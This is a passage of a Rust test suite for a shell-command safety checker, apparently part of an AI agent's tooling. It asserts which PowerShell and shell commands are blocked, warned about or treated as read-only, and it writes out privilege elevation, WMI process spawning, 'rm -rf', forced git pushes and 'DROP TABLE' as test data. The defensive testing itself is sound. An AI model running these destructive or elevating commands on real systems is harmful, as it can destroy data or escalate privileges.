        assert!(matches!(check_command_safety("Start-Process powershell -Verb RunAs"), SafetyResult::Block(_)));
    }

    #[test]
    fn test_wmi_invoke_blocked() {
        assert!(matches!(check_command_safety("Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'cmd.exe'"), SafetyResult::Block(_)));
        assert!(matches!(check_command_safety("Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine='cmd.exe'}"), SafetyResult::Block(_)));
    }

    #[test]
    fn test_unc_path_blocked() {
        assert!(matches!(check_command_safety("dir \\\\server\\share"), SafetyResult::Block(_)));
        assert!(matches!(check_command_safety("copy \\\\192.168.1.1\\share\\file.txt C:\\"), SafetyResult::Block(_)));
    }

    // --- 新增：Warn 类检查 ---

    #[test]
    fn test_long_running_warned() {
        assert!(matches!(check_command_safety("npm run dev"), SafetyResult::Warn(_)));
        assert!(matches!(check_command_safety("pnpm dev"), SafetyResult::Warn(_)));
        assert!(matches!(check_command_safety("vite"), SafetyResult::Warn(_)));
        assert!(matches!(check_command_safety("flask run"), SafetyResult::Warn(_)));
    }

    #[test]
    fn test_sleep_warned() {
        assert!(matches!(check_command_safety("sleep 5"), SafetyResult::Warn(_)));
        assert!(matches!(check_command_safety("Start-Sleep 5"), SafetyResult::Warn(_)));
    }

    #[test]
    fn test_node_modules_warned() {
        assert!(matches!(check_command_safety("dir node_modules"), SafetyResult::Warn(_)));
        assert!(matches!(check_command_safety("ls node_modules"), SafetyResult::Warn(_)));
    }

    #[test]
    fn test_control_chars_blocked() {
        assert!(matches!(check_command_safety("echo\x00test"), SafetyResult::Block(_)));
        assert!(matches!(check_command_safety("echo\x07test"), SafetyResult::Block(_)));
    }

    #[test]
    fn test_dangerous_variables_blocked() {
        assert!(matches!(check_command_safety("echo $RANDOM"), SafetyResult::Block(_)));
        assert!(matches!(check_command_safety("echo $PPID"), SafetyResult::Block(_)));
    }

    #[test]
    fn test_module_loading_warned() {
        assert!(matches!(check_command_safety("Import-Module ActiveDirectory"), SafetyResult::Warn(_)));
        assert!(matches!(check_command_safety("Install-Module -Name Az"), SafetyResult::Warn(_)));
    }

    #[test]
    fn test_dotnet_method_warned() {
        assert!(matches!(check_command_safety("[System.IO.File]::ReadAllText('C:\\test.txt')"), SafetyResult::Warn(_)));
    }

    #[test]
    fn test_alias_manipulation_warned() {
        assert!(matches!(check_command_safety("Set-Alias -Name ls -Value Get-ChildItem"), SafetyResult::Warn(_)));
    }

    // --- 只读命令检测 ---

    #[test]
    fn test_readonly_cmdlets() {
        assert!(is_readonly_command("Get-ChildItem"));
        assert!(is_readonly_command("dir"));
        assert!(is_readonly_command("Get-Content file.txt"));
        assert!(is_readonly_command("type file.txt"));
        assert!(is_readonly_command("Select-String 'pattern' file.txt"));
        assert!(is_readonly_command("Get-Process"));
        assert!(is_readonly_command("Test-Path C:\\temp"));
        assert!(is_readonly_command("Get-Date"));
        assert!(is_readonly_command("whoami"));
        assert!(is_readonly_command("hostname"));
        assert!(is_readonly_command("ipconfig"));
        assert!(is_readonly_command("systeminfo"));
    }

    #[test]
    fn test_readonly_git() {
        assert!(is_readonly_command("git status"));
        assert!(is_readonly_command("git diff"));
        assert!(is_readonly_command("git log --oneline -10"));
        assert!(is_readonly_command("git show HEAD"));
        assert!(!is_readonly_command("git push"));
        assert!(!is_readonly_command("git commit -m 'test'"));
        assert!(!is_readonly_command("git reset --hard"));
    }

    #[test]
    fn test_readonly_gh() {
        assert!(is_readonly_command("gh pr list"));
        assert!(is_readonly_command("gh issue view 123"));
        assert!(!is_readonly_command("gh pr create"));
    }

    #[test]
    fn test_readonly_docker() {
        assert!(is_readonly_command("docker ps"));
        assert!(is_readonly_command("docker images"));
        assert!(is_readonly_command("docker logs container_id"));
        assert!(!is_readonly_command("docker run ubuntu"));
        assert!(!is_readonly_command("docker rm container_id"));
    }

    #[test]
    fn test_not_readonly_with_substitution() {
        assert!(!is_readonly_command("Get-Content $(Get-Item file.txt)"));
        assert!(!is_readonly_command("$x = Get-Process"));
        assert!(!is_readonly_command("Get-Process > output.txt"));
    }

    #[test]
    fn test_readonly_pipeline() {
        assert!(is_readonly_command("Get-Process | Where-Object {$_.CPU -gt 100}"));
        assert!(is_readonly_command("dir | Sort-Object Name"));
        assert!(!is_readonly_command("Get-Process | Stop-Process"));
    }

    // --- 破坏性命令警告 ---

    #[test]
    fn test_destructive_remove() {
        assert!(get_destructive_warning("Remove-Item -Recurse -Force C:\\temp").is_some());
        assert!(get_destructive_warning("rm -rf /tmp/test").is_some());
    }

    #[test]
    fn test_destructive_git() {
        assert!(get_destructive_warning("git reset --hard HEAD~1").is_some());
        assert!(get_destructive_warning("git push --force origin main").is_some());
        assert!(get_destructive_warning("git clean -fd").is_some());
    }

    #[test]
    fn test_destructive_sql() {
        assert!(get_destructive_warning("DROP TABLE users").is_some());
        assert!(get_destructive_warning("TRUNCATE TABLE logs").is_some());
    }

    #[test]
    fn test_destructive_system() {
        assert!(get_destructive_warning("Stop-Computer").is_some());
        assert!(get_destructive_warning("Clear-RecycleBin -Force").is_some());
    }

    #[test]
    fn test_not_destructive() {
        assert!(get_destructive_warning("Get-ChildItem").is_none());
        assert!(get_destructive_warning("git status").is_none());
        assert!(get_destructive_warning("echo hello").is_none());
    }
}
